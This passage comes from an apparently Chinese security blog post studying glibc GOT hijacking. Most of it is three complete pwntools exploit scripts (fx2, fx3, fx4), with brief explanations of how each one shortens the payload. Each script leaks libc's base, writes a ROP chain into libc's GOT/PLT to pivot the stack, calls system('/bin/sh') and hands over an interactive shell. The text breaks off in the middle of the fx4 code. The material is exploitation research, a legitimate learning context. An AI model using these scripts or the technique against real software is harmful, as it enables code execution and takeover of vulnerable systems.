<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ROPgadget</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, libc: ELF, base=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">if</span> Path(<span class="string">&quot;./gadgets&quot;</span>).exists():</span><br><span class="line">            <span class="built_in">print</span>(</span><br><span class="line">                <span class="string">&quot;[!] Using gadgets, make sure that&#x27;s corresponding to the libc!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fp = <span class="built_in">open</span>(<span class="string">&quot;./gadgets&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            subprocess.run(<span class="string">f&quot;ROPgadget --binary <span class="subst">&#123;libc.path&#125;</span>&quot;</span>.split(<span class="string">&quot; &quot;</span>),</span><br><span class="line">                           stdout=fp)</span><br><span class="line">            fp.close()</span><br><span class="line">        fp = <span class="built_in">open</span>(<span class="string">&quot;./gadgets&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        data = fp.readlines()[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">        data = [x.strip().split(<span class="string">b&quot; : &quot;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data]</span><br><span class="line">        data = [[<span class="built_in">int</span>(x[<span class="number">0</span>], <span class="number">16</span>), x[<span class="number">1</span>].decode()] <span class="keyword">for</span> x <span class="keyword">in</span> data]</span><br><span class="line">        fp.close()</span><br><span class="line">        self.gadgets = data</span><br><span class="line">        self.base = base</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">for</span> addr, ctx <span class="keyword">in</span> self.gadgets:</span><br><span class="line">            <span class="keyword">match</span> = re.search(s, ctx)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                <span class="keyword">return</span> addr + self.base</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fx2</span>(<span class="params">libc: ELF, rop_chain, nudge=<span class="number">0</span></span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt0 = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">    rop2 = ROPgadget(libc, libc.address)</span><br><span class="line">    pivot = rop2.search(<span class="string">r&quot;^pop rsp ; ret&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pivot:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;can&#x27;t find pivot gadget&quot;</span>)</span><br><span class="line">    escape = rop2.search(<span class="string">r&quot;^pop rsp ; .*jmp rax&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> escape:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;can&#x27;t find escape gadget&quot;</span>)</span><br><span class="line">    write_dest = got + <span class="number">8</span></span><br><span class="line">    got_count = <span class="number">0x36</span>  <span class="comment"># hardcoded</span></span><br><span class="line">    rop_dest = write_dest + <span class="number">0x10</span> + got_count * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    rop_chain2 = flat(</span><br><span class="line">        rop_chain,</span><br><span class="line">        escape,</span><br><span class="line">        got + <span class="number">0x3000</span> - nudge * <span class="number">8</span>,  <span class="comment"># new rsp</span></span><br><span class="line">    )</span><br><span class="line">    write_data = flat(</span><br><span class="line">        rop_dest,</span><br><span class="line">        pivot,</span><br><span class="line">        [plt0] * got_count,</span><br><span class="line">        rop_chain2</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> write_dest, write_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&quot;pop rdi&quot;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rax = rop.find_gadget([<span class="string">&quot;pop rax&quot;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rop_chain = flat(</span><br><span class="line">    rdi, libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    rax, libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">)</span><br><span class="line">dest, payload = fx2(libc, rop_chain=rop_chain, nudge=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">sd(p64(dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(payload)))</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207161421600.png"></p>
<p>这样利用需要发送0x1f0 bytes的payload，有没有什么方法再缩短一下？请看下文。</p>
<h3 id="0x04-fx3"><a href="#0x04-fx3" class="headerlink" title="0x04. fx3"></a>0x04. fx3</h3><p>可以发现，其实我们没必要吧GOT表的每一项填满，对于<code>printf</code>的场景，<code>mempcpy.got</code>是最靠前的一个sink点，可以劫持它。其他不影响的GOT表项可以直接用来布置ROP gadget，因此又能大幅缩短payload。</p>
<ul>
<li>完整代码：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fx3</span>(<span class="params">libc: ELF, slot, rop_chain</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt0 = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    pivot = libc.address + <span class="number">0x0000000000035732</span>  <span class="comment"># pop rsp; ret</span></span><br><span class="line">    escape = libc.address + <span class="number">0x00000000000838f8</span>  <span class="comment"># pop rsp; jmp rax</span></span><br><span class="line"></span><br><span class="line">    write_dest = got + <span class="number">8</span></span><br><span class="line">    rop_chain2 = flat(rop_chain, escape, got + <span class="number">0x3000</span> - <span class="number">8</span>)</span><br><span class="line">    trampoline_offset = slot * <span class="number">8</span> - (write_dest - got)</span><br><span class="line">    rop_offset = <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop_chain2) &gt; trampoline_offset - <span class="number">0x10</span>:</span><br><span class="line">        rop_offset = trampoline_offset + <span class="number">8</span></span><br><span class="line">    info(<span class="string">&quot;rop offset: 0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(rop_offset))</span><br><span class="line">    write_data = flat(&#123;</span><br><span class="line">        <span class="number">0x00</span>: write_dest + rop_offset,</span><br><span class="line">        <span class="number">0x08</span>: pivot,</span><br><span class="line">        rop_offset: rop_chain2,</span><br><span class="line">        trampoline_offset: plt0,</span><br><span class="line">    &#125;, word_size=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> write_dest, write_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line">got = lbase + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">strchrnul_got = lbase + <span class="number">0x2190B8</span></span><br><span class="line">mempcpy_got = lbase + <span class="number">0x219040</span></span><br><span class="line">prdi = lbase + <span class="number">0x000000000002a3e5</span>  <span class="comment"># pop rdi; ret</span></span><br><span class="line">prax = lbase + <span class="number">0x0000000000045eb0</span>  <span class="comment"># pop rax; ret</span></span><br><span class="line"></span><br><span class="line">rop_chain = flat(</span><br><span class="line">    prdi, libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    prax, libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">)</span><br><span class="line">dest, payload = fx3(libc, slot=(mempcpy_got - got) // <span class="number">8</span>, rop_chain=rop_chain)</span><br><span class="line"></span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">sd(p64(dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(payload)))</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>





<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207161848218.png"></p>
<p>这样利用需要发送0x70 bytes的payload，有没有什么方法再缩短一下？请看下文。</p>
<h3 id="0x05-fx4"><a href="#0x05-fx4" class="headerlink" title="0x05. fx4"></a>0x05. fx4</h3><p>注意到fx3中GOT表前面有0x28 bytes的buffer没有利用起来，其实稍微构造一下也是能用来缩短payload的。</p>
<p>我们的rop chain其实只有0x20字节，塞进去还有8字节空余，放一个<code>pop rxx; ret</code>就能刚好跳过sink点，在sink点后再放第二个栈迁移gadget即可。</p>
<ul>
<li>完整代码：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fx4</span>(<span class="params">libc: ELF, slot, rop_chain</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt0 = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    pivot = libc.address + <span class="number">0x0000000000035732</span>  <span class="comment"># pop rsp; ret</span></span><br><span class="line">    escape = libc.address + <span class="number">0x00000000000838f8</span>  <span class="comment"># pop rsp; jmp rax</span></span><br><span class="line">    pr15 = libc.address + <span class="number">0x000000000002a3e4</span>  <span class="comment"># pop r15; ret</span></span><br><span class="line">    ret = libc.address + <span class="number">0x000000000002be52</span>  <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">    write_dest = got + <span class="number">8</span></span><br><span class="line">    trampoline_offset = slot * <span class="number">8</span> - (write_dest - got)</span><br><span class="line">    rop_offset = <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(rop_chain) &lt;= trampoline_offset - <span class="number">0x10</span> - <span class="number">8</span>, <span class="string">&quot;use fx3 instead&quot;</span></span><br><span class="line">    info(<span class="string">&quot;rop offset: 0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(rop_offset))</span><br><span class="line">    write_data = flat(&#123;</span><br><span class="line">        <span class="number">0x00</span>: write_dest + rop_offset,</span><br><span class="line">        <span class="number">0x08</span>: pivot,</span><br><span class="line">        rop_offset: rop_chain,</span><br><span class="line">        trampoline_offset - <span class="number">8</span>: pr15,</span><br><span class="line">        trampoline_offset: plt0,</span><br><span class="line">        trampoline_offset + <span class="number">8</span>: [escape, got + <span 